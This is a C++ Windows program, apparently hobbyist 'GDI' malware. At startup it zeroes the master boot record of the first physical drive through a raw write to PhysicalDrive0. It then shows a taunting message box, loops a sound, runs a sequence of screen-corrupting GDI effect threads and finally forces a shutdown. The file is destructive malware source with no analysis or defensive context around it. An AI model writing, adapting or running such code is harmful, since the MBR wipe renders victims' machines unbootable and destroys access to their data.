#include <Windows.h>
#include <math.h>

using namespace std;

#define MBR_SIZE 512

#pragma comment(lib, "winmm.lib")

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *PRGBQUAD;

int x = GetSystemMetrics(0);
int y = GetSystemMetrics(1);

HDC hdc = GetDC(0);


VOID WINAPI box()
{
	MessageBox(0, L"This programm eating your mbr.... xD", L"Oooops, sorry....", MB_OK | MB_ICONEXCLAMATION);
}

VOID WINAPI gdi1()
{
	while (1) {
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(0, 255, 0));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, x, y, hdc, 10, 0, 0x1900ac010e);
		BitBlt(hdc, 0, 0, x, y, hdc, x - 10, 0, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI gdi2()
{
	while (1)
	{
		int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
		while (1)
		{
			HDC hdc = GetDC(0);
			SetBkMode(hdc, 0);
			LPCSTR text = "Zeon e5 top ";
			SetTextColor(hdc, RGB(255, 255, rand() % 255));
			HFONT font = CreateFontA(150, 140, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Impact");
			SelectObject(hdc, font);
			TextOutA(hdc, rand() % w, rand() % h, text, strlen(text));
			DeleteObject(font);
			ReleaseDC(0, hdc);
			Sleep(500);
		}
	}
}

VOID WINAPI gdi3()
{
	while (1)
	{
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(228, 228, 228));
		SelectObject(hdc, brush);
		BitBlt(hdc, 10, 10, x, y, hdc, 0, 0, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI gdi4()
{
	while (1)
	{
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(250, 0, 0));
		SelectObject(hdc, brush);
		BitBlt(hdc, 10, -10, x, y, hdc, 0, 0, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI gdi5()
{
	while (1)
	{
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(0, 250, 0));
		SelectObject(hdc, brush);
		BitBlt(hdc, -30, -30, x, y, hdc, 10, 10, SRCCOPY);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI gdi6()
{
	while (1)
	{
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(0, 0, 250));
		SelectObject(hdc, brush);
		BitBlt(hdc, -30, 30, x, -y, hdc, 10, -10, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI gdi7()
{
	while (1)
	{
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(0, 0, 250));
		SelectObject(hdc, brush);
		BitBlt(hdc, -50, -50, x, y, hdc, 0, 0, SRCAND);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI gdi8()
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = y ^ y | x;
			data[i].rgb -= RGB(x, y, t);
		}
		SetBitmapBits(hbm, w * h * 6, data);
		BitBlt(desk, 10, 0, w, h, hdcdc, 0, 10, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
}

VOID WINAPI gdi9()
{
	while (1) 
	{
		HDC hdc = GetDC(0);
		int x = rand() % GetSystemMetrics(SM_CXSCREEN);
		int y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hdc, x, y, LoadIcon(0, IDI_ERROR));
		BitBlt(hdc, 10, 20, x, y, hdc, 0, 10, SRCCOPY);
		InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
	}
}
int main() 
{
	DWORD write;

	char mbr[MBR_SIZE];

	ZeroMemory(&mbr, (sizeof mbr));

	HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

	WriteFile(MasterBootRecord, mbr, MBR_SIZE, &write, NULL);

	PlaySound(L"music.wav", 0, SND_ASYNC | SND_LOOP | SND_FILENAME);

	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)box, 0, 0, 0);

	Sleep(5000);

	HANDLE gdi1h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi1, 0, 0, 0);

	Sleep(5000);

	TerminateThread(gdi1h, 0);

	HANDLE gdi2h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi2, 0, 0, 0);

	Sleep(7000);

	TerminateThread(gdi2h, 0);

	HANDLE gdi3h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi3, 0, 0, 0);

	Sleep(5000);

	TerminateThread(gdi3h, 0);

	HANDLE gdi4h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi4, 0, 0, 0);

	Sleep(5000);

	TerminateThread(gdi4h, 0);

	HANDLE gdi5h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi5, 0, 0, 0);

	Sleep(7000);

	TerminateThread(gdi5h, 0);

	HANDLE gdi6h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi6, 0, 0, 0);

	Sleep(8000);

	TerminateThread(gdi6h, 0);

	HANDLE gdi7h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi7, 0, 0, 0);

	Sleep(4000);

	TerminateThread(gdi7h, 0);

	HANDLE gdi8h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi8, 0, 0, 0);

	Sleep(8000);

	TerminateThread(gdi8h, 0);

	HANDLE gdi9h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)gdi9, 0, 0, 0);

	Sleep(8000);

	system("shutdown -s");

	Sleep(-1);
}